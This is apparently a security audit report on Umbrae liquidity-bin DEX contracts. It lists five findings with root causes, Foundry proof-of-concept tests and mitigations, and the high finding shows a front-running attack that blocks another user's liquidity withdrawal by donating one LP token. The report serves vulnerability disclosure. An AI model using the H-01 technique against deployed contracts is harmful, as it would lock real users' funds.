# Ignite Labs
Ignite Labs Audit || Dec 2025

My Finding Summary
|ID|Title|Severity|
|:-:|:---|:------:|
|[H-01](#h-01-an-attacker-can-dos-liquidity-withdrawal-for-another-user-via-lptokenholder-with-just-1-lp-token)|An attacker can DOS liquidity withdrawal for another user via LpTokenHolder with just 1 Lp token|HIGH|
|[M-01](#m-01-swaptokensforexacttokens-reverts-on-multi-hop-paths-due-to-hardcoded-fee-calculation-in-_getamountin-leading-to-dos)|swapTokensForExactTokens reverts on multi-hop paths due to hardcoded fee calculation|MEDIUM|
|[M-02](#m-02-sqrt-scaling-bug-causes-il-calculator-to-report-100-loss-for-any-price-movement)|Sqrt Scaling Bug Causes IL Calculator to Report 100% Loss for Any Price Movement|MEDIUM|
|[L-01](#l-01-router_getpricefromownpair-hardcodes-binstep25-causing-incorrect-price-calculations)|Router:_getPriceFromOwnPair hardcodes binStep=25 causing incorrect price calculations|LOW|
|[L-02](#l-02-oracle-updated-but-not-readable---dead-code-wastes-gas)|Oracle Updated But Not Readable - Dead Code Wastes Gas|LOW|

## Technical Discussions & Contributions

Throughout this audit, I actively engaged in technical discussions with other security researchers, demonstrating collaborative problem-solving and deep protocol understanding:

- **#41 (SwapQuoteResult.totalFee)**: Acknowledged @10ap17's finding on incorrect fee accumulation across multi-hop swaps with different token decimals
- **#58 (compoundLPFees theft)**: Participated in discussion about bin.totalShares not being updated during LP fee compounding, enabling fund theft
- **#18 (LP fee distribution)**: Validated @10ap17's finding on unfair LP fee distribution during multi-bin swaps - "This is solid. @10ap17 nice"
- **#26 (ActiveID DoS)**: Engaged in discussion about bitmap-based bin traversal to prevent DoS attacks

----


## [H-01] An attacker can DOS liquidity withdrawal for another user via LpTokenHolder with just 1 Lp token
### Description

An attacker can prevent legitimate users from withdrawing their liquidity by front-running their burn() transaction and donating a dust amount of LP tokens to the pair contract. This causes the victim's withdrawal to revert, temporarily locking their funds.

## Root Cause

The `_removeLiquidity()` function determines the LP token holder by checking only the first bin's balance at `address(this)`:

```solidity
address lpTokenHolder = balanceOf(address(this), ids.length > 0 ? ids[0].safe24() : 0) > 0
    ? address(this)
    : msg.sender;
```

This single-bin check is then applied to ALL bins in the withdrawal request. If an attacker donates even 1 LP token for the first bin to the pair contract, the function incorrectly assumes all LP tokens should be burned from the pair, not from the user's wallet.

## Attack Scenario

Alice (victim) holds LP tokens in bins [8388608, 8388609] in her wallet
Bob (attacker) holds a small amount of LP tokens in bin 8388608

**Step-by-Step Attack:**

1. Alice submits a transaction to withdraw liquidity: `burn([8388608, 8388609], [50e18, 50e18], alice)`
2. Bob sees Alice's pending transaction in the mempool
3. Bob front-runs with: `safeTransferFrom(bob, pair, 8388608, 1)` - donating just 1 LP token to the pair contract
4. Alice's transaction executes:
   - `lpTokenHolder = balanceOf(pair, 8388608) > 0` evaluates to `1 > 0 = TRUE`
   - Therefore `lpTokenHolder = address(pair)` instead of `alice`
   - The loop checks: `balanceOf(pair, 8388608) >= 50e18` → `1 >= 50e18` → `FALSE`
   - Transaction reverts with `LBPair__InsufficientLiquidity`
5. Alice's withdrawal fails; her funds remain locked

**Result:**
- Alice cannot withdraw her liquidity
- Cost to attacker: Gas + 1 LP token (dust amount)

## Impact

Legitimate users cannot withdraw their liquidity. An attacker can repeatedly DOS withdrawals at minimal cost.

## POC

```solidity
function test_POC_DoS_lpTokenHolderManipulation() public {
    // SETUP: Alice adds liquidity to multiple bins
    uint256 amount = 100_000e18;
    
    token0.mint(alice, amount * 4);
    token1.mint(alice, amount * 4);
    token0.mint(bob, amount * 2);
    token1.mint(bob, amount * 2);
    
    // Alice adds liquidity to TWO bins
    vm.startPrank(alice);
    token0.transfer(address(pair), amount);
    token1.transfer(address(pair), amount);
    
    uint256[] memory ids = new uint256[](2);
    uint256[] memory amounts = new uint256[](2);
    ids[0] = ACTIVE_BIN_ID;
    ids[1] = ACTIVE_BIN_ID + 1;
    amounts[0] = amount * 2;
    amounts[1] = amount;
    
    if (address(pairTokenY) == address(token0)) {
        token0.transfer(address(pair), amount);
    } else {
        token1.transfer(address(pair), amount);
    }
    
    pair.mint(ids, amounts, alice);
    vm.stopPrank();
    
    // Bob gets minimal LP tokens
    vm.startPrank(bob);
    token0.transfer(address(pair), 100);
    token1.transfer(address(pair), 100);
    
    uint256[] memory bobIds = new uint256[](1);
    uint256[] memory bobAmounts = new uint256[](1);
    bobIds[0] = ACTIVE_BIN_ID;
    bobAmounts[0] = 200;
    
    pair.mint(bobIds, bobAmounts, bob);
    vm.stopPrank();
    
    // ATTACK: Bob donates 1 LP token to pair contract
    vm.startPrank(bob);
    pair.safeTransferFrom(bob, address(pair), ACTIVE_BIN_ID, 1);
    vm.stopPrank();
    
    // VICTIM: Alice tries to withdraw
    uint256[] memory burnIds = new uint256[](2);
    uint256[] memory burnAmounts = new uint256[](2);
    burnIds[0] = ACTIVE_BIN_ID;
    burnIds[1] = ACTIVE_BIN_ID + 1;
    burnAmounts[0] = 50e18;
    burnAmounts[1] = 50e18;
    
    vm.startPrank(alice);
    
    // ATTACK SUCCESS: Transaction reverts
    vm.expectRevert(IUmbraeLBPair.LBPair__InsufficientLiquidity.selector);
    pair.burn(burnIds, burnAmounts, alice);
    
    vm.stopPrank();
}
```

## Mitigation

Check the LP token holder for each bin individually instead of relying on only the first bin's balance to determine the holder for all bins.

---

## [M-01] swapTokensForExactTokens reverts on multi-hop paths due to hardcoded fee calculation in _getAmountIn leading to DOS
### Description

The `swapTokensForExactTokens` function supports multi-hop swaps (e.g., A → B → C → D), but the internal `_getAmountIn` function uses a hardcoded 0.3% fee that ignores the number of hops. This causes all multi-hop "exact output" swaps to revert because the calculated input amount is always insufficient.

## Root Cause

Location: `UmbraeLBRouter._getAmountIn()` (lines 274-282)

The function accepts path and binSteps parameters but completely ignores them:

```solidity
function _getAmountIn(
    uint256 amountOut, 
    address[] memory /* path */,      // IGNORED - should iterate hops
    uint16[] memory /* binSteps */    // IGNORED - should account for fees per hop
) internal pure returns (uint256 amountIn) {
    // Simplified - production would use quote functions
    amountIn = (amountOut * 10030) / 10000; // 0.3% fee - HARDCODED for ALL paths
}
```

The function is called by `swapTokensForExactTokens`, which does support multi-hop paths:

```solidity
function swapTokensForExactTokens(
    uint256 amountOut,
    uint256 amountInMax,
    address[] memory path,      // Can be [A, B, C, D] for multi-hop
    uint16[] memory binSteps,   // One binStep per hop
    address to,
    uint256 deadline
) external ensure(deadline) returns (uint256 amountIn) {
    if (path.length < 2) revert LBRouter__InvalidPath();
    if (path.length - 1 != binSteps.length) revert LBRouter__InvalidPath();
    
    // BUG: _getAmountIn ignores path.length
    amountIn = _getAmountIn(amountOut, path, binSteps);
    
    // Transfer the (insufficient) calculated amount
    _safeTransferFromVerified(IERC20(path[0]), msg.sender, ..., amountIn);
    
    // Execute multi-hop swap
    _swap(path, binSteps, to);  // This correctly handles multi-hop
    
    // Check output - THIS REVERTS because input was insufficient
    if (actualAmountOut < amountOut) revert LBRouter__InsufficientAmountOut();
}
```

## Impact

- **DoS on Multi-Hop Swaps**: `swapTokensForExactTokens` always reverts for paths with 2+ hops

## POC

```solidity
function test_POC_Issue_GetAmountInDoS_MultiHop() public {
    MockToken tokenC = new MockToken("Token C", "TKC");
    
    IERC20 actualTokenB = IERC20(pair.tokenY());
    MockToken tokenBActual = MockToken(address(actualTokenB));

    MockToken token0BC = tokenBActual;
    MockToken token1BC = tokenC;
    if (address(token0BC) > address(token1BC)) {
        (token0BC, token1BC) = (token1BC, token0BC);
    }

    // Create B-C pair
    address pairBC = factory.createPair(address(token0BC), address(token1BC), ACTIVE_BIN_ID, BIN_STEP);

    // Add liquidity to B-C pair
    uint256 liquidity = 100_000e18;
    IERC20 tokenXBC = IERC20(UmbraeLBPair(pairBC).tokenX());
    IERC20 tokenYBC = IERC20(UmbraeLBPair(pairBC).tokenY());

    MockToken(address(tokenXBC)).mint(lp, liquidity);
    MockToken(address(tokenYBC)).mint(lp, liquidity);

    vm.startPrank(lp);
    tokenXBC.transfer(pairBC, liquidity / 2);
    tokenYBC.transfer(pairBC, liquidity / 2);

    uint256[] memory ids = new uint256[](1);
    uint256[] memory amounts = new uint256[](1);
    ids[0] = ACTIVE_BIN_ID;
    amounts[0] = liquidity;
    UmbraeLBPair(pairBC).mint(ids, amounts, lp);
    vm.stopPrank();

    // User wants EXACTLY 5000 tokens C via multi-hop A -> B -> C
    uint256 desiredExactOutput = 5_000e18;
    uint256 maxInput = 10_000e18;

    MockToken startToken = MockToken(address(pair.tokenX()));
    startToken.mint(user, maxInput);

    vm.startPrank(user);
    startToken.approve(address(router), maxInput);

    address[] memory path = new address[](3);
    path[0] = address(startToken);
    path[1] = address(tokenBActual);
    path[2] = address(tokenC);

    uint16[] memory binSteps = new uint16[](2);
    binSteps[0] = BIN_STEP;
    binSteps[1] = BIN_STEP;

    // THE BUG: _getAmountIn calculates insufficient amount
    vm.expectRevert(UmbraeLBRouter.LBRouter__InsufficientAmountOut.selector);
    router.swapTokensForExactTokens(
        desiredExactOutput,
        maxInput,
        path,
        binSteps,
        user,
        block.timestamp + 1000
    );

    vm.stopPrank();
}
```

## Mitigation

Calculate input iteratively for each hop in the path.

---

## [M-02] Sqrt Scaling Bug Causes IL Calculator to Report 100% Loss for Any Price Movement
### Description

The `calculateIL()` function in `ILCalculator.sol` computes impermanent loss using the standard IL formula: `IL = 2 * sqrt(r) / (1 + r) - 1`.

However, when calling the `sqrt()` function on a 1e18-scaled number, the result is returned in 1e9 scale (since sqrt halves the decimal places).

The code fails to restore the 1e18 scale after the sqrt operation, causing all subsequent calculations to be off by a factor of 1 billion. This results in the IL calculation reporting approximately -9999 basis points (-99.99% loss) for ANY price movement, regardless of actual magnitude.

## Root Cause

In `ILCalculator.sol`, the `calculateIL()` function:

```solidity
function calculateIL(uint256 initialPriceRatio, uint256 currentPriceRatio)
    internal pure returns (int256 ilPercentage)
{
    // priceRatio is 1e18 scaled (e.g., 2e18 represents 2.0)
    uint256 priceRatio = (currentPriceRatio * 1e18) / initialPriceRatio;

    // BUG: sqrt(2e18) = 1.414e9, NOT 1.414e18
    // sqrt halves the decimal places: sqrt(1e18) = 1e9
    uint256 sqrtRatio = sqrt(priceRatio);  // Returns 1e9 scale

    // Code assumes sqrtRatio is 1e18 scale
    uint256 numerator = 2 * sqrtRatio;              // 2.828e9
    uint256 denominator = 1e18 + priceRatio;        // 3e18
    uint256 ratio = (numerator * 1e18) / denominator; // 0.9428e9 (should be 0.9428e18)

    // Comparison expects 1e18 scale
    if (ratio >= 1e18) {
        ilPercentage = 0;
    } else {
        // (1e18 - 0.9428e9) ≈ 1e18, so loss ≈ 9999 basis points
        uint256 loss = ((1e18 - ratio) * 10000) / 1e18;
        ilPercentage = -int256(loss);  // Reports -9999 (99.99% loss)
    }
}
```

## Impact

- Any call to `calculatePositionIL()` returns approximately -99.99% IL regardless of actual price movement
- The `calculatePositionHealth()` function receives the wrong IL value, causing all positions to show as "unhealthy" (score ~50 instead of ~95)

## POC

```solidity
function test_POC_SqrtScalingBugInILCalculation() public {
    // Setup: Add liquidity at the active bin (entry point)
    _addLiquidityToActiveBin(alice, 100 ether, 100 ether);
    
    uint24 entryBinId = ACTIVE_ID;
    
    // Simulate price movement by doing swaps
    vm.startPrank(bob);
    tokenA.approve(address(pair), 50 ether);
    tokenA.transfer(address(pair), 50 ether);
    pair.swap(true, bob);
    vm.stopPrank();
    
    // Prepare bin IDs for IL calculation
    uint24[] memory binIds = new uint24[](1);
    binIds[0] = ACTIVE_ID;
    
    // Call calculatePositionIL
    (int256 totalILPercentage, uint256 inRangePercentage, uint8 healthScore) = 
        pair.calculatePositionIL(alice, binIds, entryBinId);
    
    // BUG: IL reports >90% loss due to sqrt scaling issue
    // Expected: ~-200 to -500 bps for a 50% reserve swap
    // Actual: -9999 bps (99.99% loss)
    assertTrue(
        totalILPercentage < -9000, 
        "BUG CONFIRMED: IL reports >90% loss due to sqrt scaling issue"
    );
    
    // Health score incorrectly shows unhealthy position
    assertTrue(
        healthScore < 60,
        "BUG CONFIRMED: Health score incorrectly shows unhealthy position"
    );
}
```

**Test outputs:**
```
calculatePositionIL returned: (-9999, 10000, 50)
totalILPercentage = -9999  (reports 99.99% loss - WRONG)
healthScore = 50           (shows unhealthy - WRONG)
```

## Mitigation

In `ILCalculator.sol`, multiply the sqrt result by 1e9 to restore 1e18 scale:

```solidity
// Before (buggy):
uint256 sqrtRatio = sqrt(priceRatio);

// After (fixed):
uint256 sqrtRatio = sqrt(priceRatio) * 1e9;
```

---

## [L-01] Router:_getPriceFromOwnPair hardcodes binStep=25 causing incorrect price calculations
### Description

The protocol's factory allows creating pairs with multiple binStep values (10, 20, 25, 50, 100), but the Router's `_getPriceFromOwnPair` function hardcodes binStep=25 when calculating prices.

This causes `getBinsAroundMarketPrice` and `getCurrentMarketBinId` to return completely wrong results for any pair not using binStep=25.

## Root Cause

The factory allows multiple binStep values:

```solidity
constructor(address _owner) Ownable(_owner) {
    _allowedBinSteps[10] = true;   // 0.1%
    _allowedBinSteps[20] = true;   // 0.2%
    _allowedBinSteps[25] = true;   // 0.25%
    _allowedBinSteps[50] = true;   // 0.5%
    _allowedBinSteps[100] = true;  // 1%
}
```

But the Router hardcodes binStep=25:

```solidity
function _getPriceFromOwnPair(address tokenA, address tokenB) internal view returns (uint256 price) {
    address pair = FACTORY.getPair(tokenA, tokenB, 25);
    // ... fallback logic finds pair with other binSteps ...
    
    IUmbraeLBPair lbPair = IUmbraeLBPair(pair);
    uint24 activeId = lbPair.getActiveId();

    // BUG: ALWAYS uses binStep=25, even if pair has binStep=100!
    return BinHelper.getPriceFromId(activeId, 25);  // <-- HARDCODED 25
}
```

## Impact

- Wrong bin IDs returned from `getBinsAroundMarketPrice`
- Liquidity placed at wrong price levels
- Incorrect data from `getCurrentMarketPrice` and `getCurrentMarketBinId`

## Mitigation

Fix `_getPriceFromOwnPair` to use the pair's actual binStep.

---

## [L-02] Oracle Updated But Not Readable - Dead Code Wastes Gas
### Description

The `UmbraeLBPair.sol` contract updates an internal oracle during every swap, storing historical price and volatility data. However, the contract does not implement any external functions to read this data. The `IOracleManager` interface defines `getTWAP()`, `getVolatility()`, and `getLatestPrice()` functions, but none are implemented in `UmbraeLBPair.sol`. This results in gas being wasted on every swap for data that cannot be accessed.

## Root Cause

In `UmbraeLBPair.swap()`, the oracle is updated on every qualifying swap:

```solidity
// Update oracle
if (OracleLibrary.shouldUpdate(_lastOracleUpdate)) {
    _oracle.update(_activeId, _volatilityAccumulator);
    _lastOracleUpdate = uint40(block.timestamp);
    emit OracleUpdated(_activeId, _lastOracleUpdate);
}
```

The `IOracleManager` interface defines read functions:

```solidity
interface IOracleManager {
    function getTWAP(uint40 secondsAgo, uint40 windowSize) external view returns (uint24 averageId);
    function getVolatility(uint40 secondsAgo, uint40 windowSize) external view returns (uint128 volatility);
    function getLatestPrice() external view returns (uint24 activeId, uint40 timestamp);
}
```

However, `UmbraeLBPair`:
- Does NOT inherit from `IOracleManager`
- Does NOT implement `getTWAP()`
- Does NOT implement `getVolatility()`
- Does NOT implement `getLatestPrice()`

The oracle data is written but can never be read.

## Impact

Oracle update costs ~5,000-20,000 gas per swap with no benefit.

## Mitigation

Implement the oracle getter functions or remove the oracle update logic.
